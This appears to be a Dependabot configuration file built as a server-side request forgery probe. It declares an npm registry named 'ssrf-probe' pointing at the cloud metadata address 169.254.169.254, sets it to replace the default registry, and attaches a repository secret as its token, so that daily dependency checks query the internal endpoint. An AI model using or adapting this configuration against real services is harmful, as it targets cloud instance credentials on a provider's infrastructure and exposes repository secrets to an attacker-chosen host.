version: 2
registries:
  ssrf-probe:
    type: npm-registry
    url: http://169.254.169.254
    token: ${{ secrets.SSRF_TOKEN }}
    replaces-base: true
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "daily"
    registries:
      - ssrf-probe
